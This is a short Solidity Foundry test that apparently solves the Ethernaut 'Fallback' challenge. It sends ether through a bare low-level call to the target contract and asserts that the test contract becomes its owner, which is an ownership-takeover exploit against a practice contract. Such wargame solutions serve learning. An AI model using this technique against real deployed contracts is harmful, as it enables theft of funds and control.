// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_1/Fallback.sol";

contract FallbackTest is Test {
    Fallback public fb;

    function setUp() public {
        fb = new Fallback();
    }

    function testAttack() public {
        vm.deal(address(this), 1 ether);

        address(fb).call{value: 0.1 ether}("");

        assertEq(fb.owner(), address(this));
    }
}
